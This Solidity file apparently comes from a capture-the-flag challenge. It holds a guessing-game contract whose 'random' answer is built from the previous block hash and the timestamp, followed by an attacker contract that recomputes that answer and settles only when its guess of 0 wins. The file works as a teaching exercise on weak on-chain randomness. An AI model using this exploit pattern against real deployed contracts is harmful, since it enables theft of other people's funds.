pragma solidity ^0.4.21;


/*
This time, you have to lock in your guess before the random number is generated. To give you a sporting chance, there are only ten possible answers.

Note that it is indeed possible to solve this challenge without losing any ether.
*/

contract PredictTheFutureChallenge {
    address guesser;
    uint8 guess;
    uint256 settlementBlockNumber;

    function PredictTheFutureChallenge() public payable {
        require(msg.value == 1 ether);
    }

    function isComplete() public view returns (bool) {
        return address(this).balance == 0;
    }

    function lockInGuess(uint8 n) public payable {
        require(guesser == 0);
        require(msg.value == 1 ether);

        guesser = msg.sender;
        guess = n;
        settlementBlockNumber = block.number + 1;
    }

    function settle() public {
        require(msg.sender == guesser); 
        require(block.number > settlementBlockNumber); 

        uint8 answer = uint8(keccak256(block.blockhash(block.number - 1), now)) % 10;

        guesser = 0;
        if (guess == answer) {
            msg.sender.transfer(2 ether);
        }
    }
}

/*
Solution: The answer can only be the numbers from 0 to 9, I just make the call when I'm sure I can win.
*/
contract PredictTheFutureChallengeAttacker {
    address victim;

    function PredictTheFutureChallengeAttacker(address _victim) public {
        victim = _victim;
    }

    function lockInGuess() public payable {
        PredictTheFutureChallenge(victim).lockInGuess.value(1 ether)(0); // Guess will be 0
    }

    function attack() public {
        uint8 answer = uint8(keccak256(block.blockhash(block.number - 1), now)) % 10;

        if(answer == 0) {
            PredictTheFutureChallenge(victim).settle();
        }
    }

    function() payable public {
    }
}